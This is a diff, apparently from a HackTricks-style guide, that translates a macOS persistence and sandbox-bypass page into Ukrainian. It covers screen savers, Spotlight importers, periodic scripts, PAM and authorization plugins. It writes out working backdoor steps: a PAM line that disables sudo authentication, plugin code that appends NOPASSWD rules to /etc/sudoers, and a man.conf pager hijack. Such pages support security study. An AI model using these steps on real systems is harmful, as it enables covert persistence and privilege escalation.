+Опис: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)
+* Корисно для обхідної пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
+* Потрібна дуже конкретна дія
+* Ви потрапите в іншу пісочницю
+* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
 
-* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
-  * A very specific action needs to happen
-  * You will end in another sandbox
-* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
-
-#### Location
+#### Місце
 
 * `/Library/ColorPickers`
-  * Root required
-  * Trigger: Use the color picker
+* Потрібні права адміністратора
+* Тригер: Використання пікера кольорів
 * `~/Library/ColorPickers`
-  * Trigger: Use the color picker
+* Тригер: Використання пікера кольорів
 
-#### Description & Exploit
+#### Опис та Використання
 
-**Compile a color picker** bundle with your code (you could use [**this one for example**](https://github.com/viktorstrate/color-picker-plus)) and add a constructor (like in the [Screen Saver section](macos-auto-start-locations.md#screen-saver)) and copy the bundle to `~/Library/ColorPickers`.
+**Скомпілюйте пакунок** пікера кольорів з вашим кодом (наприклад, ви можете використати [**цей**](https://github.com/viktorstrate/color-picker-plus)) та додайте конструктор (як у розділі [Заставки](macos-auto-start-locations.md#screen-saver)) і скопіюйте пакунок в `~/Library/ColorPickers`.
 
-Then, when the color picker is triggered your should should be aswell.
+Потім, коли пікер кольорів буде активований, ваш код також буде виконаний.
 
-Note that the binary loading your library has a **very restrictive sandbox**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
+Зверніть увагу, що бінарний файл, який завантажує вашу бібліотеку, має **дуже обмежену пісочницю**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
 
 {% code overflow="wrap" %}
 ```bash
 [Key] com.apple.security.temporary-exception.sbpl
-	[Value]
-		[Array]
-			[String] (deny file-write* (home-subpath "/Library/Colors"))
-			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
-			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
+[Value]
+[Array]
+[String] (deny file-write* (home-subpath "/Library/Colors"))
+[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
+[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
 ```
 {% endcode %}
 
-### Finder Sync Plugins
+### Плагіни Finder Sync
 
-**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
-**Writeup**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)
+**Опис**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
+**Опис**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)
 
-* Useful to bypass sandbox: **No, because you need to execute your own app**
-* TCC bypass: ???
+* Корисно для обхіду пісочниці: **Ні, оскільки потрібно виконати власний додаток**
+* Обхід TCC: ???
 
-#### Location
+#### Місцезнаходження
 
-* A specific app
+* Конкретний додаток
 
-#### Description & Exploit
+#### Опис та Використання
 
-An application example with a Finder Sync Extension [**can be found here**](https://github.com/D00MFist/InSync).
+Приклад додатку з розширенням Finder Sync можна знайти [**тут**](https://github.com/D00MFist/InSync).
 
-Applications can have `Finder Sync Extensions`. This extension will go inside an application that will be executed. Moreover, for the extension to be able to execute its code it **must be signed** with some valid Apple developer certificate, it must be **sandboxed** (although relaxed exceptions could be added) and it must be registered with something like:
-
+Додатки можуть мати `Розширення Finder Sync`. Це розширення буде вбудовано в додаток, який буде виконаний. Більше того, для того, щоб розширення могло виконати свій код, воно **повинно бути підписане** дійсним сертифікатом розробника Apple, воно повинно бути **пісочницею** (хоча можуть бути додані винятки) та повинно бути зареєстровано з чимось на зразок:
 ```bash
 pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
 pluginkit -e use -i com.example.InSync.InSync
 ```
+### Екранна заставка
 
-### Screen Saver
+Опис: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
+Опис: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
-Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
+* Корисно для обхіду пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
+* Але ви потрапите в звичайну пісочницю додатків
+* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
 
-* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
-  * But you will end in a common application sandbox
-* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
-
-#### Location
+#### Місце
 
 * `/System/Library/Screen Savers`
-  * Root required
-  * **Trigger**: Select the screen saver
+* Потрібні права адміністратора
+* **Тригер**: Виберіть екранну заставку
 * `/Library/Screen Savers`
-  * Root required
-  * **Trigger**: Select the screen saver
+* Потрібні права адміністратора
+* **Тригер**: Виберіть екранну заставку
 * `~/Library/Screen Savers`
-  * **Trigger**: Select the screen saver
+* **Тригер**: Виберіть екранну заставку
 
 <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>
 
-#### Description & Exploit
+#### Опис та Використання
 
-Create a new project in Xcode and select the template to generate a new **Screen Saver**. Then, are your code to it, for example the following code to generate logs.
+Створіть новий проект у Xcode та виберіть шаблон для створення нової **екранної заставки**. Потім додайте до нього свій код, наприклад, наступний код для генерації журналів.
 
-**Build** it, and copy the `.saver` bundle to **`~/Library/Screen Savers`**. Then, open the Screen Saver GUI and it you just click on it, it should generate a lot of logs:
+**Збудуйте** його та скопіюйте пакет `.saver` до **`~/Library/Screen Savers`**. Потім відкрийте GUI екранної заставки та просто клацніть на неї, вона повинна згенерувати багато журналів:
 
 {% code overflow="wrap" %}
 ```bash
@@ -1069,11 +1018,10 @@ Timestamp                       (process)[PID]
 {% endcode %}
 
 {% hint style="danger" %}
-Note that because inside the entitlements of the binary that loads this code (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) you can find **`com.apple.security.app-sandbox`** you will be **inside the common application sandbox**.
+Зверніть увагу, що через entitlements бінарного файлу, який завантажує цей код (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), ви будете **в межах звичайного пісочниця додатків**.
 {% endhint %}
 
 Saver code:
-
 ```objectivec
 //
 //  ScreenSaverExampleView.m
@@ -1088,200 +1036,193 @@ Saver code:
 
 - (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
 {
-    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
-    self = [super initWithFrame:frame isPreview:isPreview];
-    if (self) {
-        [self setAnimationTimeInterval:1/30.0];
-    }
-    return self;
+NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
+self = [super initWithFrame:frame isPreview:isPreview];
+if (self) {
+[self setAnimationTimeInterval:1/30.0];
+}
+return self;
 }
 
 - (void)startAnimation
 {
-    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
-    [super startAnimation];
+NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
+[super startAnimation];
 }
 
 - (void)stopAnimation
 {
-    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
-    [super stopAnimation];
+NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
+[super stopAnimation];
 }
 
 - (void)drawRect:(NSRect)rect
 {
-    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
-    [super drawRect:rect];
+NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
+[super drawRect:rect];
 }
 
 - (void)animateOneFrame
 {
-    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
-    return;
+NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
+return;
 }
 
 - (BOOL)hasConfigureSheet
 {
-    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
-    return NO;
+NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
+return NO;
 }
 
 - (NSWindow*)configureSheet
 {
-    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
-    return nil;
+NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
+return nil;
 }
 
 __attribute__((constructor))
 void custom(int argc, const char **argv) {
-    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
+NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
 }
 
 @end
 ```
-
-### Spotlight Plugins
+### Плагіни Spotlight
 
 writeup: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)
 
-* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
-  * But you will end in an application sandbox
-* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
-  * The sandbox looks very limited
+* Корисно для обхіду пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
+* Але ви опинитеся в обмеженій пісочниці додатка
+* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
+* Пісочниця виглядає дуже обмеженою
 
-#### Location
+#### Місцезнаходження
 
 * `~/Library/Spotlight/`
-  * **Trigger**: A new file with a extension managed by the spotlight plugin is created.
+* **Тригер**: Створюється новий файл з розширенням, керованим плагіном Spotlight.
 * `/Library/Spotlight/`
-  * **Trigger**: A new file with a extension managed by the spotlight plugin is created.
-  * Root required
+* **Тригер**: Створюється новий файл з розширенням, керованим плагіном Spotlight.
+* Потрібні права адміністратора
 * `/System/Library/Spotlight/`
-  * **Trigger**: A new file with a extension managed by the spotlight plugin is created.
-  * Root required
+* **Тригер**: Створюється новий файл з розширенням, керованим плагіном Spotlight.
+* Потрібні права адміністратора
 * `Some.app/Contents/Library/Spotlight/`
-  * **Trigger**: A new file with a extension managed by the spotlight plugin is created.
-  * New app required
+* **Тригер**: Створюється новий файл з розширенням, керованим плагіном Spotlight.
+* Потрібен новий додаток
 
-#### Description & Exploitation
+#### Опис та Використання
 
-Spotlight is macOS's built-in search feature, designed to provide users with **quick and comprehensive access to data on their computers**.\
-To facilitate this rapid search capability, Spotlight maintains a **proprietary database** and creates an index by **parsing most files**, enabling swift searches through both file names and their content.
+Spotlight - це вбудована функція пошуку macOS, призначена для забезпечення користувачам **швидкого та всебічного доступу до даних на їх комп'ютерах**.\
+Для полегшення цієї швидкості пошуку, Spotlight підтримує **власну базу даних** та створює індекс, **аналізуючи більшість файлів**, що дозволяє швидко шукати як за назвами файлів, так і за їх вмістом.
 
-The underlying mechanism of Spotlight involves a central process named 'mds', which stands for **'metadata server'.** This process orchestrates the entire Spotlight service. Complementing this, there are multiple 'mdworker' daemons that perform a variety of maintenance tasks, such as indexing different file types (`ps -ef | grep mdworker`). These tasks are made possible through Spotlight importer plugins, or **".mdimporter bundles**", which enable Spotlight to understand and index content across a diverse range of file formats.
+Основний механізм Spotlight включає центральний процес під назвою 'mds', що означає **'сервер метаданих'**. Цей процес керує всім сервісом Spotlight. Доповнюючи це, є кілька демонів 'mdworker', які виконують різноманітні завдання обслуговування, такі як індексація різних типів файлів (`ps -ef | grep mdworker`). Ці завдання стають можливими завдяки плагінам імпорту Spotlight або **".mdimporter bundles**", які дозволяють Spotlight розуміти та індексувати вміст у різноманітних форматах файлів.
 
-The plugins or **`.mdimporter`** bundles are located in the places mentioned previously and if a new bundle appear it's loaded within monute (no need to restart any service). These bundles need to indicate which **file type and extensions they can manage**, this way, Spotlight will use them when a new file with the indicated extension is created.
+Плагіни або **`.mdimporter`** bundles розташовані в раніше згаданих місцях, і якщо з'являється новий пакет, він завантажується протягом хвилини (не потрібно перезапускати жодний сервіс). Ці пакети повинні вказувати, які **типи файлів та розширення вони можуть керувати**, таким чином, Spotlight використовуватиме їх, коли створюється новий файл з вказаним розширенням.
 
-It's possible to **find all the `mdimporters`** loaded running:
-
+Можливо **знайти всі `mdimporters`**, які завантажені, запустивши:
 ```bash
 mdimport -L
 Paths: id(501) (
-    "/System/Library/Spotlight/iWork.mdimporter",
-    "/System/Library/Spotlight/iPhoto.mdimporter",
-    "/System/Library/Spotlight/PDF.mdimporter",
-    [...]
+"/System/Library/Spotlight/iWork.mdimporter",
+"/System/Library/Spotlight/iPhoto.mdimporter",
+"/System/Library/Spotlight/PDF.mdimporter",
+[...]
 ```
-
-And for example **/Library/Spotlight/iBooksAuthor.mdimporter** is used to parse these type of files (extensions `.iba` and `.book` among others):
-
+І, наприклад, **/Library/Spotlight/iBooksAuthor.mdimporter** використовується для аналізу цих типів файлів (розширення `.iba` та `.book` серед інших):
 ```json
 plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist
 
 [...]
 "CFBundleDocumentTypes" => [
-    0 => {
-      "CFBundleTypeName" => "iBooks Author Book"
-      "CFBundleTypeRole" => "MDImporter"
-      "LSItemContentTypes" => [
-        0 => "com.apple.ibooksauthor.book"
-        1 => "com.apple.ibooksauthor.pkgbook"
-        2 => "com.apple.ibooksauthor.template"
-        3 => "com.apple.ibooksauthor.pkgtemplate"
-      ]
-      "LSTypeIsPackage" => 0
-    }
-  ]
+0 => {
+"CFBundleTypeName" => "iBooks Author Book"
+"CFBundleTypeRole" => "MDImporter"
+"LSItemContentTypes" => [
+0 => "com.apple.ibooksauthor.book"
+1 => "com.apple.ibooksauthor.pkgbook"
+2 => "com.apple.ibooksauthor.template"
+3 => "com.apple.ibooksauthor.pkgtemplate"
+]
+"LSTypeIsPackage" => 0
+}
+]
 [...]
- => {
-      "UTTypeConformsTo" => [
-        0 => "public.data"
-        1 => "public.composite-content"
-      ]
-      "UTTypeDescription" => "iBooks Author Book"
-      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
-      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
-      "UTTypeTagSpecification" => {
-        "public.filename-extension" => [
-          0 => "iba"
-          1 => "book"
-        ]
-      }
-    }
+=> {
+"UTTypeConformsTo" => [
+0 => "public.data"
+1 => "public.composite-content"
+]
+"UTTypeDescription" => "iBooks Author Book"
+"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
+"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
+"UTTypeTagSpecification" => {
+"public.filename-extension" => [
+0 => "iba"
+1 => "book"
+]
+}
+}
 [...]
 ```
-
 {% hint style="danger" %}
-If you check the Plist of other `mdimporter` you might not find the entry **`UTTypeConformsTo`**. Thats because that is a built-in _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) and it doesn't need to specify extensions.
+Якщо ви перевіряєте Plist іншого `mdimporter`, ви, можливо, не знайдете запис **`UTTypeConformsTo`**. Це тому, що це вбудований _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) і не потребує вказувати розширення.
 
-Moreover, System default plugins always take precedence, so an attacker can only access files that are not otherwise indexed by Apple's own `mdimporters`.
+Більше того, системні стандартні плагіни завжди мають пріоритет, тому зловмисник може отримати доступ лише до файлів, які не індексуються іншими `mdimporters` Apple.
 {% endhint %}
 
-To create your own importer you could start with this project: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) and then change the name, the **`CFBundleDocumentTypes`** and add **`UTImportedTypeDeclarations`** so it supports the extension you would like to support and refelc them in **`schema.xml`**.\
-Then **change** the code of the function **`GetMetadataForFile`** to execute your payload when a file with the processed extension is created.
+Для створення власного імпортера ви можете почати з цього проекту: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) і потім змінити назву, **`CFBundleDocumentTypes`** та додати **`UTImportedTypeDeclarations`**, щоб підтримувати розширення, які ви хочете підтримати, і відобразити їх у **`schema.xml`**.\
+Потім **змініть** код функції **`GetMetadataForFile`**, щоб виконати вашу вразливість, коли створюється файл з обробленим розширенням.
 
-Finally **build and copy your new `.mdimporter`** to one of thre previous locations and you can chech whenever it's loaded **monitoring the logs** or checking **`mdimport -L.`**
+Нарешті **збудуйте та скопіюйте свій новий `.mdimporter`** до одного з попередніх місць, і ви можете перевірити, коли він завантажується, **моніторинг логів** або перевіряючи **`mdimport -L.`**
 
 ### ~~Preference Pane~~
 
 {% hint style="danger" %}
-It doesn't look like this is working anymore.
+Здається, що це більше не працює.
 {% endhint %}
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)
+Опис: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)
 
-* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
-  * It needs a specific user action
-* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
+* Корисно для обходу пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
+* Потрібна конкретна дія користувача
+* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Location
+#### Місце
 
 * **`/System/Library/PreferencePanes`**
 * **`/Library/PreferencePanes`**
 * **`~/Library/PreferencePanes`**
 
-#### Description
+#### Опис
 
-It doesn't look like this is working anymore.
+Здається, що це більше не працює.
 
-## Root Sandbox Bypass
+## Обхід кореневої пісочниці
 
 {% hint style="success" %}
-Here you can find start locations useful for **sandbox bypass** that allows you to simply execute something by **writing it into a file** being **root** and/or requiring other **weird conditions.**
+Тут ви знайдете початкові місця, корисні для **обходу пісочниці**, які дозволяють просто виконати щось, **записавши це в файл**, бути **root** та/або потребувати інших **дивних умов.**
 {% endhint %}
 
-### Periodic
+### Періодичний
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)
+Опис: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)
 
-* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
-  * But you need to be root
-* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
+* Корисно для обходу пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
+* Але вам потрібно бути root
+* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Location
+#### Місце
 
 * `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
-  * Root required
-  * **Trigger**: When the time comes
-* `/etc/daily.local`, `/etc/weekly.local` or `/etc/monthly.local`
-  * Root required
-  * **Trigger**: When the time comes
+* Потрібен root
+* **Тригер**: Коли настане час
+* `/etc/daily.local`, `/etc/weekly.local` або `/etc/monthly.local`
+* Потрібен root
+* **Тригер**: Коли настане час
 
-#### Description & Exploitation
+#### Опис та Використання
 
-The periodic scripts (**`/etc/periodic`**) are executed because of the **launch daemons** configured in `/System/Library/LaunchDaemons/com.apple.periodic*`. Note that scripts stored in `/etc/periodic/` are **executed** as the **owner of the file,** so this won't work for a potential privilege escalation.
-
-{% code overflow="wrap" %}
+Періодичні скрипти (**`/etc/periodic`**) виконуються через налаштовані **демони запуску** в `/System/Library/LaunchDaemons/com.apple.periodic*`. Зверніть увагу, що скрипти, збережені в `/etc/periodic/`, виконуються як **власник файлу**, тому це не працюватиме для потенційного підвищення привілеїв.
 ```bash
 # Launch daemons that will execute the periodic scripts
 ls -l /System/Library/LaunchDaemons/com.apple.periodic*
@@ -1314,19 +1255,17 @@ total 8
 ```
 {% endcode %}
 
-There are other periodic scripts that will be executed indicated in **`/etc/defaults/periodic.conf`**:
-
+Існують інші періодичні скрипти, які будуть виконані, вказані в **`/etc/defaults/periodic.conf`**:
 ```bash
 grep "Local scripts" /etc/defaults/periodic.conf
 daily_local="/etc/daily.local"				# Local scripts
 weekly_local="/etc/weekly.local"			# Local scripts
 monthly_local="/etc/monthly.local"			# Local scripts
 ```
-
-If you manage to write any of the files `/etc/daily.local`, `/etc/weekly.local` or `/etc/monthly.local` it will be **executed sooner or later**.
+Якщо ви зможете записати будь-який з файлів `/etc/daily.local`, `/etc/weekly.local` або `/etc/monthly.local`, він буде **виконаний раніше чи пізніше**.
 
 {% hint style="warning" %}
-Note that the periodic script will be **executed as the owner of the script**. So if a regular user owns the script, it will be executed as that user (this might prevent privilege escalation attacks).
+Зверніть увагу, що періодичний скрипт буде **виконаний як власник скрипта**. Таким чином, якщо звичайний користувач є власником скрипта, він буде виконаний як цей користувач (це може запобігти атакам на підвищення привілеїв).
 {% endhint %}
 
 ### PAM
@@ -1334,32 +1273,27 @@ Note that the periodic script will be **executed as the owner of the script**. S
 Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
 Writeup: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)
 
-* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
-  * But you need to be root
-* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
+* Корисно для обхіду пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
+* Але вам потрібно бути root
+* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Location
+#### Місцезнаходження
 
-* Root always required
+* Завжди потрібен root
 
-#### Description & Exploitation
+#### Опис та експлуатація
 
-As PAM is more focused in **persistence** and malware that on easy execution inside macOS, this blog won't give a detailed explanation, **read the writeups to understand this technique better**.
+Оскільки PAM більше спрямований на **постійність** та шкідливе програмне забезпечення, ніж на просте виконання в macOS, цей блог не надасть детального пояснення, **прочитайте описи, щоб краще зрозуміти цю техніку**.
 
-Check PAM modules with:
-
+Перевірте модулі PAM за допомогою:
 ```bash
 ls -l /etc/pam.d
 ```
-
-A persistence/privilege escalation technique abusing PAM is as easy as modifying the module /etc/pam.d/sudo adding at the beginning the line:
-
+Техніка збереження/підвищення привілеїв, яка використовує PAM, полягає в тому, що модифікуємо модуль /etc/pam.d/sudo, додаючи на початку рядок:
 ```bash
 auth       sufficient     pam_permit.so
 ```
-
-So it will **looks like** something like this:
-
+Так це буде **виглядати** приблизно так:
 ```bash
 # sudo: auth account password session
 auth       sufficient     pam_permit.so
@@ -1370,32 +1304,30 @@ account    required       pam_permit.so
 password   required       pam_deny.so
 session    required       pam_permit.so
 ```
-
-And therefore any attempt to use **`sudo` will work**.
+Тому будь-яка спроба використання **`sudo` буде працювати**.
 
 {% hint style="danger" %}
-Note that this directory is protected by TCC so it's highly probably that the user will get a prompt asking for access.
+Зверніть увагу, що цей каталог захищений TCC, тому дуже ймовірно, що користувач отримає запит на доступ.
 {% endhint %}
 
-### Authorization Plugins
+### Плагіни авторизації
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
-Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
+Опис: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)\
+Опис: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
 
-* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
-  * But you need to be root and make extra configs
-* TCC bypass: ???
+* Корисно для обхіду пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
+* Але вам потрібно бути root та робити додаткові налаштування
+* Обхід TCC: ???
 
-#### Location
+#### Місцезнаходження
 
 * `/Library/Security/SecurityAgentPlugins/`
-  * Root required
-  * It's also needed to configure the authorization database to use the plugin
+* Потрібні права root
+* Також потрібно налаштувати базу даних авторизації для використання плагіна
 
-#### Description & Exploitation
+#### Опис та Використання
 
-You can create an authorization plugin that will be executed when a user logs-in to maintain persistence. For more information about how to create one of these plugins check the previous writeups (and be careful, a poorly written one can lock you out and you will need to clean your mac from recovery mode).
-
+Ви можете створити плагін авторизації, який буде виконуватися при вході користувача для збереження постійності. Для отримання додаткової інформації про створення одного з цих плагінів перегляньте попередні описи (і будьте обережні, погано написаний плагін може заблокувати вас, і вам доведеться очистити свій Mac у режимі відновлення).
 ```objectivec
 // Compile the code and create a real bundle
 // gcc -bundle -framework Foundation main.m -o CustomAuth
@@ -1406,74 +1338,64 @@ You can create an authorization plugin that will be executed when a user logs-in
 
 __attribute__((constructor)) static void run()
 {
-    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
-    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
+NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
+system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
 }
 ```
-
-**Move** the bundle to the location to be loaded:
-
+**Перемістіть** пакет до місця, з якого він буде завантажений:
 ```bash
 cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
 ```
-
-Finally add the **rule** to load this Plugin:
-
+Нарешті додайте **правило** для завантаження цього плагіна:
 ```bash
 cat > /tmp/rule.plist <<EOF
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-            <key>class</key>
-            <string>evaluate-mechanisms</string>
-            <key>mechanisms</key>
-            <array>
-                <string>CustomAuth:login,privileged</string>
-            </array>
-        </dict>
+<key>class</key>
+<string>evaluate-mechanisms</string>
+<key>mechanisms</key>
+<array>
+<string>CustomAuth:login,privileged</string>
+</array>
+</dict>
 </plist>
 EOF
 
 security authorizationdb write com.asdf.asdf < /tmp/rule.plist
 ```
+**`evaluate-mechanisms`** повідомить фреймворку авторизації, що йому потрібно **викликати зовнішній механізм для авторизації**. Крім того, **`privileged`** зробить його виконуваним користувачем root.
 
-The **`evaluate-mechanisms`** will tell the authorization framework that it will need to **call an external mechanism for authorization**. Moreover, **`privileged`** will make it be executed by root.
-
-Trigger it with:
-
+Запустіть його за допомогою:
 ```bash
 security authorize com.asdf.asdf
 ```
-
-And then the **staff group should have sudo** access (read `/etc/sudoers` to confirm).
+І потім **група персоналу повинна мати доступ sudo** (прочитайте `/etc/sudoers`, щоб підтвердити).
 
 ### Man.conf
 
-Writeup: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)
+Опис: [https://theevilbit.github.io/beyond/beyond\_0030/](https://theevilbit.github.io/beyond/beyond\_0030/)
 
-* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
-  * But you need to be root and the user must use man
-* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
+* Корисно для обхіду пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
+* Але вам потрібно бути root та користувач повинен використовувати man
+* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Location
+#### Місце
 
 * **`/private/etc/man.conf`**
-  * Root required
-  * **`/private/etc/man.conf`**: Whenever man is used
+* Потрібен root
+* **`/private/etc/man.conf`**: Кожного разу, коли використовується man
 
-#### Description & Exploit
+#### Опис та Використання
 
-The config file **`/private/etc/man.conf`** indicate the binary/script to use when opening man documentation files. So the path to the executable could be modified so anytime the user uses man to read some docs a backdoor is executed.
+Файл конфігурації **`/private/etc/man.conf`** вказує на бінарний/скрипт, який використовується при відкритті файлів документації man. Таким чином, шлях до виконавчого файлу можна змінити, щоб кожного разу, коли користувач використовує man для читання документів, виконувалася задній прохід.
 
-For example set in **`/private/etc/man.conf`**:
-
+Наприклад, встановлено в **`/private/etc/man.conf`**:
 ```
 MANPAGER /tmp/view
 ```
-
-And then create `/tmp/view` as:
-
+І потім створіть `/tmp/view` як:
 ```bash
 #!/bin/zsh
 
@@ -1481,42 +1403,36 @@ touch /tmp/manconf
 
 /usr/bin/less -s
 ```
-
 ### Apache2
 
-**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)
+**Опис**: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)
 
-* Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
-  * But you need to be root and apache needs to be running
-* TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
-  * Httpd doesn't have entitlements
+* Корисно для обхіду пісочниці: [🟠](https://emojipedia.org/large-orange-circle)
+* Але вам потрібно мати права root та запущений apache
+* Обхід TCC: [🔴](https://emojipedia.org/large-red-circle)
+* Httpd не має entitlements
 
-#### Location
+#### Місце
 
 * **`/etc/apache2/httpd.conf`**
-  * Root required
-  * Trigger: When Apache2 is started
+* Потрібні права root
+* Тригер: Коли запускається Apache2
 
-#### Description & Exploit
+#### Опис та Exploit
 
-You can indicate in `/etc/apache2/httpd.conf` to load a module adding a line such as:
-
-{% code overflow="wrap" %}
+Ви можете вказати у `/etc/apache2/httpd.conf` завантаження модуля, додавши рядок, наприклад:
 ```bash
 LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
 ```
 {% endcode %}
 
